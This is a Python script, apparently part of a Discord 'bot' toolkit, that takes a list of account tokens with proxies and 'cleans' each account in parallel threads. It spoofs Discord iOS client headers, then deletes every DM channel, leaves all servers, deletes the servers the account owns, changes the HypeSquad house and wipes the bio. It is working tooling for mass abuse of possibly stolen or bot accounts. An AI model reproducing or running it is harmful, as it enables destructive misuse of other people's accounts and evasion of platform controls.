import base64
import random
import sys
import time
import multiprocessing.dummy as mp
import uuid

import requests
from base64 import b64encode as encoder
from rich.console import Console
import colorama
from colorama import Fore, Style
from datetime import datetime
import os
from utils import change_title
from utils import Config
from utils import check_user_proxy
from multiprocessing import Lock
from test import getheaders
from utils import get_path

print_lock = Lock()

cwd = os.getcwd()

colorama.init(autoreset=True)

console = Console()

task_log_list = []




SUCCESSFUL = 0
FAILED = 0

def updateStatusBar(success=False):
    global SUCCESSFUL
    global FAILED

    if success == True:
        SUCCESSFUL += 1
    elif success == False:
        FAILED += 1
    change_title(f"Bot - Token Cleaner / Successful: {str(SUCCESSFUL)} - Failed: {str(FAILED)}")


class Changer:
    def __init__(self, task, i):
        config = Config()
        self.task = task
        self.taskId = f"Task-{i}"

        self.webhook_url = config["webhook_url"]

        if ":" in task.split(";")[0]:
            self.token = self.task.split(";")[0].split(":")[2]
        else:
            self.token = self.task.split(";")[0]

        self.proxy = self.task.split(";")[1]



        try:
            if "@" in self.proxy:
                self.http_proxy = self.proxy
            else:
                split = self.proxy.split(':')
                good_format = (f'{split[2]}:{split[3]}@{split[0]}:{split[1]}')
                self.http_proxy = f"{good_format}"
            proxies = {
                "http": f"http://{self.http_proxy}",
                "https": f"http://{self.http_proxy}"
            }
        except:
            print("Please check your Proxy", flush=True)
            time.sleep(2)
            sys.exit()

        self.s = requests.Session()
        self.s.proxies.update(proxies)

        try:

            r = self.s.get("https://discord.com/ios/129.0/manifest.json", headers={
                "Host": "discord.com",
                "Accept": "*/*",
                "User-Agent": "Discord/129.0 (iPhone; iOS 15.4.1; Scale/3.00)",
                "Accept-Language": "de-DE;q=1, en-GB;q=0.9",
                "Accept-Encoding": "gzip",
                "Connection": "keep-alive"
            })

            dcfduid = r.cookies.values()[0]
            sdcfduid = r.cookies.values()[1]

            self.headers = {
                "Host": "discord.com",
                "Cookie": f"__dcfduid={dcfduid}; __sdcfduid={sdcfduid}",
                "Content-Type": "application/json",
                "X-Debug-Options": "bugReporterEnabled",
                "Accept": "*/*",
                "Authorization": self.token,
                "X-Discord-Locale": "de",
                "Accept-Language": "de-DE,en-GB;q=0.9",
                "User-Agent": "Discord/32871 CFNetwork/1331.0.7 Darwin/21.4.0",
                "X-Super-Properties": "eyJvcyI6ImlPUyIsImJyb3dzZXIiOiJEaXNjb3JkIGlPUyIsImRldmljZSI6ImlQaG9uZTE0LDUiLCJzeXN0ZW1fbG9jYWxlIjoiZGUtREUiLCJjbGllbnRfdmVyc2lvbiI6IjEyOS4wIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiZGV2aWNlX3ZlbmRvcl9pZCI6IkZFNERCQzVFLTE5QzUtNEEzQi05QTg2LTBBQzY3N0I0Mzk1NiIsImJyb3dzZXJfdXNlcl9hZ2VudCI6IiIsImJyb3dzZXJfdmVyc2lvbiI6IiIsIm9zX3ZlcnNpb24iOiIxNS40LjEiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjozMzAwOCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=",
            }
        except Exception as e:
            self.exitTask(f"Error while building headers - {e}")

        try:
            self.delete_dm_channels()
            self.leave_guild()
            self.change_hypesquad()
            self.change_bio()
            self.SuccessfulTask()
        except Exception as e:
            self.exitTask(f"Error while cleaning token - {e}")

    def error(self, text):
        spaces = 3 - len(self.taskId)
        MESSAGE = '[{}] [{}{}] {}'.format(Fore.MAGENTA + datetime.now().strftime('%H:%M:%S.%f') + Style.RESET_ALL,
                                          ' ' * spaces, Fore.RED + self.taskId + Style.RESET_ALL, Fore.RED + text)
        print_lock.acquire()
        print(MESSAGE, Style.RESET_ALL)
        print_lock.release()


    def success(self, text):
        spaces = 3 - len(self.taskId)
        MESSAGE = '[{}] [{}{}] {}'.format(Fore.MAGENTA + datetime.now().strftime('%H:%M:%S.%f') + Style.RESET_ALL,
                                          ' ' * spaces, Fore.GREEN + self.taskId + Style.RESET_ALL, Fore.GREEN + text)
        print_lock.acquire()
        print(MESSAGE, Style.RESET_ALL)
        print_lock.release()

    def status(self, text):
        spaces = 3 - len(self.taskId)
        MESSAGE = '[{}] [{}{}] {}'.format(Fore.MAGENTA + datetime.now().strftime('%H:%M:%S.%f') + Style.RESET_ALL,
                                          ' ' * spaces, self.taskId, text)
        print_lock.acquire()
        print(MESSAGE, Style.RESET_ALL)
        print_lock.release()


    def exitTask(self, error):
        self.error(error)
        updateStatusBar(success=False)
        return

    def SuccessfulTask(self):
        self.success("Successful cleaned token")
        updateStatusBar(success=True)
        return

    def delete_clipped(self):
        old_row = self.task.split(";")[0] + ";" + self.task.split(";")[1]
        with open(get_path("tokens.txt"), "r") as f:
            lines = f.readlines()
        with open(get_path("tokens.txt"), "w") as f:
            for line in lines:
                if line.strip("\n") != old_row:
                    f.write(line)
        f.close()

    def delete_dm_channels(self):
        channels = self.s.get('https://discord.com/api/v9/users/@me/channels', headers=self.headers)
        i = 0

        if channels.status_code not in [401, 403]:
            for channel in channels.json():
                response = self.s.delete(f'https://discord.com/api/v9/channels/{channel["id"]}', headers=self.headers)
                i += 1
                    
                if response.status_code == 200:
                    self.status(f'[{channel["id"]}] [{i}/{len(channels.json())}] Removed dm')
            return True
        else:
            self.error("Error while deleting dm")
            return False

    def leave_guild(self):
        guilds = self.s.get('https://discord.com/api/v8/users/@me/guilds', headers=self.headers)
        i = 0

        if guilds.status_code not in [401, 403]:
            for guild in guilds.json():
                i += 1
                if guild['owner'] == False:
                    response = self.s.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild["id"]}', headers=self.headers, json={"lurking":False})
                        
                    if response.status_code == 204:
                        self.status(f'[{guild["name"]}] [{i}/{len(guilds.json())}] Removed guild')

                else:
                    response = self.s.delete(f'https://discord.com/api/v8/guilds/{guild["id"]}', headers=self.headers)
                        
                    if response.status_code == 204:
                        self.status(f'[{guild["name"]}] [{i}/{len(guilds.json())}] Deleted guild')
            
            return True
        else:
            self.error("Error while leaving guild")
            return False
    
    def change_hypesquad(self):
        response = self.s.post('https://discord.com/api/v9/hypesquad/online', headers=self.headers, json={'house_id': random.randint(1, 3)})

        if response.status_code == 204:
            self.status(f'Hypesquad changed')
        else:
            self.error("Error while changing hypesquad")

    def change_bio(self):
        self.s.patch('https://discord.com/api/v9/users/@me', headers=self.headers, json={'bio': ''})
        self.status('Bio removed')



def main():
    change_title("Bot - Token Cleaner")
    global counter
    counter = 0

    config = Config()
    threads = config["threads"]
    amount = int(input(" Amount: "))

    x = check_user_proxy()
    tasks = []
    y = 1


    try:
        if int(len(x)) == 0:
            console.print("Not enough tokens")
            time.sleep(2)
            sys.exit()
        else:
            pass

        # row = random.choice(x)
        for row in x:
            if row not in tasks:
                tasks.append(f"{row}")
    except IndexError:
        print("Not enough tokens")
        return
    except Exception as e:
        print(f"Error while getting tokens - {e}")
        time.sleep(2)
        sys.exit()

    task_list = tasks[:amount]


    p = mp.Pool(int(threads))
    p.map(worker, task_list)
    p.close()
    p.join()

    print()
    print(f'{Fore.MAGENTA}Token Cleaner / Successful: {SUCCESSFUL} - Failed: {FAILED}')
    input(f'{Fore.LIGHTGREEN_EX}Entering done, press Enter to go back ')
    time.sleep(1)



def worker(tasks):
    global counter
    counter += 1
    Changer(tasks, counter)